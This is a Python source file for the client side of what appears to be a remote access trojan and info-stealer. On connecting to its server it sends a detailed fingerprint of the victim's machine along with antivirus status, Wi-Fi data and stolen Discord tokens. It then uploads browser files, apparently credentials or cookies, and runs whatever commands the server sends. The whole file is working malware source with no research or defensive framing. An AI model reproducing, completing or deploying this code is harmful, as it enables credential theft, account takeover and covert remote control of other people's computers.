import os
import socket
import json
import platform
import requests
import time
import uuid
import psutil
import sys
import threading
import base64

from modules import wifi
from modules.discord import discord
from modules.browser.browser_shared import get_installed_browsers
from modules.browser import browser
from modules.disk import disk
from modules.antivirus import antivirus
from common import utils
from client.handlers import CommandHandler
from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message, MESSAGE_TYPE_PREFILE, MESSAGE_TYPE_FILE


class Client:
    """Client class to represent a client that connects to the server."""
    def __init__(self, server_address: tuple[str, int], command_handler: CommandHandler) -> None:
        self.server_address = server_address
        self.command_handler = command_handler
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect_to_server()
        self.send_system_info()

        # Send a file to the server from: cool.txt
        self.send_file("cool.txt")

    def connect_to_server(self) -> None:
        """Connect to the server."""
        try:
            self.client.connect(self.server_address)
        except Exception as e:
            print(f"Failed to connect to server at {self.server_address}: {e}")
            sys.exit(1)

    def send_system_info(self) -> None:
        """Send system information to the server."""
        ip = requests.get("https://api.ipify.org").text
        country = requests.get("https://ipapi.co/country_name").text
        isp = requests.get("https://ipapi.co/org").text

        self.send(json.dumps(Message(type=MESSAGE_TYPE_CONNECTION, json_data={
            "computer_name": platform.node(),
            "computer_os": platform.system(),
            "computer_version": platform.version(),
            "total_memory": psutil.virtual_memory().total,
            "up_time": time.strftime("%H:%M:%S", time.gmtime(psutil.boot_time())),
            "uuid": str(uuid.UUID(int=uuid.getnode())),
            "cpu": platform.processor(),
            "gpu": utils.get_gpu_info(),
            "uac": utils.isUserAdmin(),
            "anti_virus": json.dumps(antivirus.Antivirus().execute()),
            "ip": ip,
            "client_ip": self.client.getsockname()[0],
            "country": country,
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)]),
            "gateway": psutil.net_if_addrs().get('Ethernet')[1].address if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "dns": ', '.join([dns.address for dns in psutil.net_if_addrs().get('Ethernet') if dns and dns.family == 2]) if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "subnet_mask": psutil.net_if_addrs().get('Ethernet')[0].netmask if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "isp": isp,
            "timezone": time.tzname[0],
            "disks": json.dumps(disk.Disk().execute()),
            "wifi": wifi.get_wifi(),
            "webbrowsers": get_installed_browsers(),
            "discord_tokens": discord.Discord().execute(),
        }).to_dict()))

    def modular_run(self) -> None:
        files = browser.Browser().execute()
        for file in files:
            self.send_file(file)

    def send_file(self, file_path: str) -> None:
        print(f"Sending file '{file_path}' to server...")

        # Notify server about the file
        self.send(json.dumps(Message(type=MESSAGE_TYPE_PREFILE, json_data={
            "file_name": file_path.split("\\")[-1],
            "file_size": os.path.getsize(file_path),
        }).to_dict()))

        response = json.loads(self.receive())

        # Retrieve file ID from server response
        id = response.get("data")
        if not id:
            print(f"Failed to receive file ID for '{file_path}'")
            return

        # Send file in chunks
        with open(file_path, "rb") as file:
            while True:
                chunk = file.read(1024)
                if not chunk:
                    break
                self.client.sendall(chunk)
            self.client.sendall(b'END_OF_FILE')

    def send(self, data: str) -> None:
        chunk_size = 1024
        for i in range(0, len(data), chunk_size):
            self.client.sendall(data[i:i+chunk_size].encode('utf-8'))
        self.client.sendall(b'END_OF_MESSAGE')

    def receive(self) -> str:
        chunks = []
        while True:
            chunk = self.client.recv(8192)
            if b'END_OF_MESSAGE' in chunk:
                chunks.append(chunk.replace(b'END_OF_MESSAGE', b'').decode('utf-8'))
                break
            chunks.append(chunk.decode('utf-8'))
        return ''.join(chunks)

    def send_keep_alive(self) -> None:
        try:
            self.send(json.dumps(Message(type=MESSAGE_TYPE_PING, data=None).to_dict()))
        except Exception as e:
            print(f"Failed to send keep-alive message: {e}")

    def run(self) -> None:
        def keep_alive():
            while True:
                self.send_keep_alive()
                time.sleep(30)

        threading.Thread(target=keep_alive, daemon=True).start()

        try:
            while True:
                data = self.receive()
                if not data:
                    print("Server closed the connection.")
                    break
                self.command_handler.handle(self, data)
        except Exception as e:
            print(f"Error in client lifetime: {e}")
        finally:
            self.close()

    def close(self) -> None:
        self.client.close()
